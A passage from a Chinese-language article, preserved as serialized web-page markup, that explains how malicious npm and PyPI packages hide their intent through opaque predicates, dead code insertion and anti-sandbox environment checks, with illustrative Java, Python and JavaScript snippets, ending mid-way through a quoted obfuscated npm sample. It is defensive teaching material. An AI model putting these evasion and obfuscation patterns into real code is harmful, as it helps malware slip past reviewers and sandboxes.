punctuation\",\"children\":\"{\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[\"        \",[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// someCondition 可能是不透明谓词\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[\"        state \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"=\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token number\",\"children\":\"1\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// 条件满足则跳转到恶意代码\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[\"      \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"}\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token keyword control-flow\",\"children\":\"else\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"{\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[\"        state \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"=\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token number\",\"children\":\"3\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[\"      \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"}\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[\"      \",[\"$\",\"span\",null,{\"className\":\"token keyword control-flow\",\"children\":\"break\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[\"    \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"case\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token number\",\"children\":\"3\"}],[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\":\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[\"      \",[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// console.log(\\\"End\\\");\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[\"      \",[\"$\",\"span\",null,{\"className\":\"token keyword control-flow\",\"children\":\"return\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[\"  \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"}\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"}\"}],\"\\n\"]}]]}]}],[\"$\",\"p\",null,{\"children\":\"分析这种混淆需要耐心和使用专门的去混淆工具或调试器来追踪真实的执行路径。\"}],[\"$\",\"h3\",null,{\"className\":\"content-header\",\"id\":\"5-无用代码插入-dead-code-insertion\",\"children\":[[\"$\",\"a\",null,{\"href\":\"#5-无用代码插入-dead-code-insertion\",\"aria-hidden\":\"true\",\"tabIndex\":\"-1\",\"children\":[\"$\",\"span\",null,{\"className\":\"content-header-link\",\"children\":[\"$\",\"svg\",null,{\"className\":\"h-5 linkicon w-5\",\"fill\":\"currentColor\",\"viewBox\":\"0 0 20 20\",\"xmlns\":\"http://www.w3.org/2000/svg\",\"children\":[[\"$\",\"path\",null,{\"d\":\"M12.232 4.232a2.5 2.5 0 0 1 3.536 3.536l-1.225 1.224a.75.75 0 0 0 1.061 1.06l1.224-1.224a4 4 0 0 0-5.656-5.656l-3 3a4 4 0 0 0 .225 5.865.75.75 0 0 0 .977-1.138 2.5 2.5 0 0 1-.142-3.667l3-3Z\"}],[\"$\",\"path\",null,{\"d\":\"M11.603 7.963a.75.75 0 0 0-.977 1.138 2.5 2.5 0 0 1 .142 3.667l-3 3a2.5 2.5 0 0 1-3.536-3.536l1.225-1.224a.75.75 0 0 0-1.061-1.06l-1.224 1.224a4 4 0 1 0 5.656 5.656l3-3a4 4 0 0 0-.225-5.865Z\"}]]}]}]}],\"5. 无用代码插入 (Dead Code Insertion)\"]}],[\"$\",\"p\",null,{\"children\":[[\"$\",\"strong\",null,{\"children\":\"攻击者为何青睐此法：\"}],\" 无关的代码会分散分析人员的注意力，掩盖恶意负载，并可能使自动化检测工具产生误判或性能下降。\"]}],[\"$\",\"p\",null,{\"children\":[[\"$\",\"strong\",null,{\"children\":\"如何帮助攻击者：\"}],\" 审查人员可能会花费时间分析这些无意义的代码片段，从而无意中忽略了真正的恶意指令。\"]}],[\"$\",\"p\",null,{\"children\":[[\"$\",\"strong\",null,{\"children\":\"原理详解：\"}],\" 此技术涉及向源代码中添加大量永远不会被执行或执行结果不影响程序主要功能的代码。\"]}],[\"$\",\"ul\",null,{\"children\":[[\"$\",\"li\",null,{\"children\":[[\"$\",\"strong\",null,{\"children\":\"永假条件块：\"}],\" \",[\"$\",\"code\",null,{\"className\":\"custom-code\",\"children\":\"if (false) { ... }\"}],\" 或 \",[\"$\",\"code\",null,{\"className\":\"custom-code\",\"children\":\"if (1 \u003e 2) { ... }\"}],\"。\"]}],[\"$\",\"li\",null,{\"children\":[[\"$\",\"strong\",null,{\"children\":\"无法访问的代码：\"}],\" 在 \",[\"$\",\"code\",null,{\"className\":\"custom-code\",\"children\":\"return\"}],\" 语句之后，或在无限循环（没有 \",[\"$\",\"code\",null,{\"className\":\"custom-code\",\"children\":\"break\"}],\"）之后的代码。\"]}],[\"$\",\"li\",null,{\"children\":[[\"$\",\"strong\",null,{\"children\":\"计算无用变量：\"}],\" 声明并计算一些变量，但这些变量后续从未使用过。\"]}],[\"$\",\"li\",null,{\"children\":[[\"$\",\"strong\",null,{\"children\":\"调用无副作用的函数：\"}],\" 调用一些空函数或仅执行一些无关紧要操作的函数。\"]}]]}],[\"$\",\"$L19\",null,{\"className\":\"language-java\",\"children\":[\"$\",\"code\",null,{\"className\":\"code-highlight language-java\",\"children\":[[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// Java 示例：分散注意力的无关逻辑\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"public\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"void\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token function\",\"children\":\"someMethod\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"{\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[\"  \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"int\"}],\" a \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"=\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token number\",\"children\":\"10\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\",\"}],\" b \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"=\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token number\",\"children\":\"20\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\",\"}],\" c \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"=\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token number\",\"children\":\"0\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[\"  \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"for\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"int\"}],\" i \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"=\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token number\",\"children\":\"0\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\" i \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"\u003c\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token number\",\"children\":\"100\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\" i\",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"++\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"{\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[\"    c \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"+=\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],\"a \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"*\"}],\" b\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"/\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],\"i \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"+\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token number\",\"children\":\"1\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// 复杂的无用计算\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[\"  \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"}\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[\"  \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"if\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token class-name\",\"children\":\"System\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token function\",\"children\":\"currentTimeMillis\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"\u003c\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token number\",\"children\":\"0\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"{\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// 永假条件\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[\"    \",[\"$\",\"span\",null,{\"className\":\"token class-name\",\"children\":\"System\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],\"out\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token function\",\"children\":\"println\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token string\",\"children\":\"\\\"This will never be printed.\\\"\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[\"    \",[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// some_other_irrelevant_code();\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[\"  \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"}\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[\"  \",[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// 真正的恶意逻辑可能隐藏在后面\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[\"  \",[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// Runtime.getRuntime().exec(\\\"malicious command\\\");\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"}\"}],\"\\n\"]}]]}]}],[\"$\",\"p\",null,{\"children\":\"虽然这些代码不执行，但它们增加了代码的体积和复杂性，干扰了分析过程。\"}],[\"$\",\"h3\",null,{\"className\":\"content-header\",\"id\":\"6-基于环境的混淆检测-environment-based-obfuscationdetection\",\"children\":[[\"$\",\"a\",null,{\"href\":\"#6-基于环境的混淆检测-environment-based-obfuscationdetection\",\"aria-hidden\":\"true\",\"tabIndex\":\"-1\",\"children\":[\"$\",\"span\",null,{\"className\":\"content-header-link\",\"children\":[\"$\",\"svg\",null,{\"className\":\"h-5 linkicon w-5\",\"fill\":\"currentColor\",\"viewBox\":\"0 0 20 20\",\"xmlns\":\"http://www.w3.org/2000/svg\",\"children\":[[\"$\",\"path\",null,{\"d\":\"M12.232 4.232a2.5 2.5 0 0 1 3.536 3.536l-1.225 1.224a.75.75 0 0 0 1.061 1.06l1.224-1.224a4 4 0 0 0-5.656-5.656l-3 3a4 4 0 0 0 .225 5.865.75.75 0 0 0 .977-1.138 2.5 2.5 0 0 1-.142-3.667l3-3Z\"}],[\"$\",\"path\",null,{\"d\":\"M11.603 7.963a.75.75 0 0 0-.977 1.138 2.5 2.5 0 0 1 .142 3.667l-3 3a2.5 2.5 0 0 1-3.536-3.536l1.225-1.224a.75.75 0 0 0-1.061-1.06l-1.224 1.224a4 4 0 1 0 5.656 5.656l3-3a4 4 0 0 0-.225-5.865Z\"}]]}]}]}],\"6. 基于环境的混淆/检测 (Environment-Based Obfuscation/Detection)\"]}],[\"$\",\"p\",null,{\"children\":[[\"$\",\"strong\",null,{\"children\":\"攻击者为何青睐此法：\"}],\" 仅在特定环境条件下（如生产服务器、特定操作系统、检测到非调试环境）激活恶意软件，可以避免在受控的安全测试环境（沙箱、分析虚拟机）中被检测到。\"]}],[\"$\",\"p\",null,{\"children\":[[\"$\",\"strong\",null,{\"children\":\"如何帮助攻击者：\"}],\" 恶意代码仅在目标环境中执行，从而成功规避了早期的检测和分析。\"]}],[\"$\",\"p\",null,{\"children\":[[\"$\",\"strong\",null,{\"children\":\"原理详解：\"}],\" 恶意软件在执行前会检查其运行环境。如果环境符合其预设的“安全”或“目标”条件，则执行恶意负载；否则，它可能保持静默或执行一些无害的行为。\"]}],[\"$\",\"ul\",null,{\"children\":[[\"$\",\"li\",null,{\"children\":[[\"$\",\"strong\",null,{\"children\":\"反沙箱/反虚拟机技术：\"}],[\"$\",\"ul\",null,{\"children\":[[\"$\",\"li\",null,{\"children\":[\"检测虚拟化软件的特定文件、注册表项、进程（如 \",[\"$\",\"code\",null,{\"className\":\"custom-code\",\"children\":\"vmtoolsd.exe\"}],\"）。\"]}],[\"$\",\"li\",null,{\"children\":\"检测 CPU 特性或指令执行时间的差异（虚拟机通常比物理机慢）。\"}],[\"$\",\"li\",null,{\"children\":\"检测常见的分析工具进程（如 Wireshark, Process Explorer）。\"}],[\"$\",\"li\",null,{\"children\":[\"检测调试器的存在（如通过 \",[\"$\",\"code\",null,{\"className\":\"custom-code\",\"children\":\"IsDebuggerPresent()\"}],\" API）。\"]}]]}]]}],[\"$\",\"li\",null,{\"children\":[[\"$\",\"strong\",null,{\"children\":\"时间延迟执行：\"}],\" 在系统启动或首次运行后等待一段较长的时间（如几小时或几天）再执行恶意行为，以期躲过沙箱的短期监控。\"]}],[\"$\",\"li\",null,{\"children\":[[\"$\",\"strong\",null,{\"children\":\"用户活动检测：\"}],\" 检查鼠标移动、键盘输入、窗口交互等，确认是真实用户环境而非自动化分析环境。\"]}],[\"$\",\"li\",null,{\"children\":[[\"$\",\"strong\",null,{\"children\":\"特定配置检测：\"}],\" 检查特定的域名、IP 地址、用户名、系统语言或是否存在某些特定文件，只在这些条件满足时激活。\"]}]]}],[\"$\",\"$L19\",null,{\"className\":\"language-python\",\"children\":[\"$\",\"code\",null,{\"className\":\"code-highlight language-python\",\"children\":[[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"import\"}],\" os\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"import\"}],\" time\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":\"\\n\"}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"# 简单的环境检测示例\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"def\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token function\",\"children\":\"check_environment\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\":\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[\"    \",[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"# 检测是否在虚拟机内 (简化示例，实际检测更复杂)\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[\"    \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"if\"}],\" os\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],\"path\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],\"exists\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token string\",\"children\":\"\\\"/.dockerenv\\\"\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"or\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token string\",\"children\":\"\\\"VMware\\\"\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"in\"}],\" os\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],\"popen\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token string\",\"children\":\"\\\"systeminfo\\\"\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],\"read\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\":\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[\"        \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"return\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token boolean\",\"children\":\"False\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"# 在虚拟机或 Docker 中，不激活\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":\"\\n\"}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[\"    \",[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"# 检测是否有调试器 (概念)\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[\"    \",[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"# if is_debugger_present():\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[\"    \",[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"#    return False\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":\"\\n\"}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[\"    \",[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"# 检测特定用户名\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[\"    \",[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"# if os.getlogin() == \\\"sandbox_user\\\":\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[\"    \",[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"#    return False\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[\"    \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"return\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token boolean\",\"children\":\"True\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":\"\\n\"}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"def\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token function\",\"children\":\"malicious_payload\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\":\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[\"    \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"print\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token string\",\"children\":\"\\\"Executing malicious payload...\\\"\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[\"    \",[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"# ... 恶意代码 ...\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":\"\\n\"}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"if\"}],\" os\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],\"getenv\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token string\",\"children\":\"'APP_ENV'\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"==\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token string\",\"children\":\"'production'\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"and\"}],\" check_environment\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\":\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[\"    \",[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"# 仅在生产环境且通过环境检测后执行\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[\"    \",[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"# time.sleep(3600) # 延迟一小时执行\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[\"    \",[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"# exec(\\\"some_obfuscated_malicious_code_string\\\")\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[\"    malicious_payload\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"else\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\":\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[\"    \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"print\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token string\",\"children\":\"\\\"Running in a safe or non-target environment.\\\"\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],\"\\n\"]}]]}]}],[\"$\",\"h2\",null,{\"className\":\"content-header\",\"id\":\"从理论到现实混淆技术实战\",\"children\":[[\"$\",\"a\",null,{\"href\":\"#从理论到现实混淆技术实战\",\"aria-hidden\":\"true\",\"tabIndex\":\"-1\",\"children\":[\"$\",\"span\",null,{\"className\":\"content-header-link\",\"children\":[\"$\",\"svg\",null,{\"className\":\"h-5 linkicon w-5\",\"fill\":\"currentColor\",\"viewBox\":\"0 0 20 20\",\"xmlns\":\"http://www.w3.org/2000/svg\",\"children\":[[\"$\",\"path\",null,{\"d\":\"M12.232 4.232a2.5 2.5 0 0 1 3.536 3.536l-1.225 1.224a.75.75 0 0 0 1.061 1.06l1.224-1.224a4 4 0 0 0-5.656-5.656l-3 3a4 4 0 0 0 .225 5.865.75.75 0 0 0 .977-1.138 2.5 2.5 0 0 1-.142-3.667l3-3Z\"}],[\"$\",\"path\",null,{\"d\":\"M11.603 7.963a.75.75 0 0 0-.977 1.138 2.5 2.5 0 0 1 .142 3.667l-3 3a2.5 2.5 0 0 1-3.536-3.536l1.225-1.224a.75.75 0 0 0-1.061-1.06l-1.224 1.224a4 4 0 1 0 5.656 5.656l3-3a4 4 0 0 0-.225-5.865Z\"}]]}]}]}],\"从理论到现实：混淆技术实战\"]}],[\"$\",\"p\",null,{\"children\":\"以上讨论了多种理论上的混淆技术，但现实世界中的恶意混淆是什么样的呢？安全公司的研究团队（如原文提到的 Socket）在各种生态系统中发现了大量真实案例。以下是一些在 npm 和 PyPI 包中检测到的实际威胁，展示了攻击者如何应用这些混淆方法来逃避检测、利用漏洞并危及系统安全。\"}],[\"$\",\"h3\",null,{\"className\":\"content-header\",\"id\":\"npm-真实案例分析\",\"children\":[[\"$\",\"a\",null,{\"href\":\"#npm-真实案例分析\",\"aria-hidden\":\"true\",\"tabIndex\":\"-1\",\"children\":[\"$\",\"span\",null,{\"className\":\"content-header-link\",\"children\":[\"$\",\"svg\",null,{\"className\":\"h-5 linkicon w-5\",\"fill\":\"currentColor\",\"viewBox\":\"0 0 20 20\",\"xmlns\":\"http://www.w3.org/2000/svg\",\"children\":[[\"$\",\"path\",null,{\"d\":\"M12.232 4.232a2.5 2.5 0 0 1 3.536 3.536l-1.225 1.224a.75.75 0 0 0 1.061 1.06l1.224-1.224a4 4 0 0 0-5.656-5.656l-3 3a4 4 0 0 0 .225 5.865.75.75 0 0 0 .977-1.138 2.5 2.5 0 0 1-.142-3.667l3-3Z\"}],[\"$\",\"path\",null,{\"d\":\"M11.603 7.963a.75.75 0 0 0-.977 1.138 2.5 2.5 0 0 1 .142 3.667l-3 3a2.5 2.5 0 0 1-3.536-3.536l1.225-1.224a.75.75 0 0 0-1.061-1.06l-1.224 1.224a4 4 0 1 0 5.656 5.656l3-3a4 4 0 0 0-.225-5.865Z\"}]]}]}]}],\"npm 真实案例分析\"]}],[\"$\",\"$L19\",null,{\"className\":\"language-javascript\",\"children\":[\"$\",\"code\",null,{\"className\":\"language-javascript code-highlight\",\"children\":[[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// let w = false; // 此变量在提供的片段中未使用，可能是更大代码块的一部分\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// const wait = () =\u003e { // wait 函数定义了一个复杂的立即执行函数表达式 (IIFE) 和Promise链\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// \\tvar _0x1262=['\\\\x74\\\\x68\\\\x65\\\\x6e']; // 1. 字符串数组混淆：将字符串 'then' 存储在数组中\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// \\t(function(_0x1248e3,_0x53b88c){ // 2. IIFE 用于创建独立作用域，并可能进行数组移位/洗牌\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// \\t\\tvar _0x1262eb=function(_0x27d80e){\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// \\t\\t\\twhile(--_0x27d80e){\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// 